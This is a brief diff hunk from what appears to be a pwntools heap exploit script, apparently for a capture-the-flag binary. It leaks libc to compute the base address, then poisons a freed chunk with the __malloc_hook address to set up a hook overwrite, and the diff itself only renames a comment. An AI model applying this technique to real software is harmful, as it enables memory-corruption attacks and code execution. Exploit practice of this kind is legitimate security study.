@@ -283,7 +283,7 @@ leak = view(0)
 libc.address = u64(leak.ljust(8,b"\x00")) -  (0x3554d8 + libc.sym.puts)
 info(f"LIBC: {hex(libc.address)}")
 
-## uaf
+## double free
 add(2, 0x68)
 delete(2)
 write(2, p64(libc.sym.__malloc_hook-35))
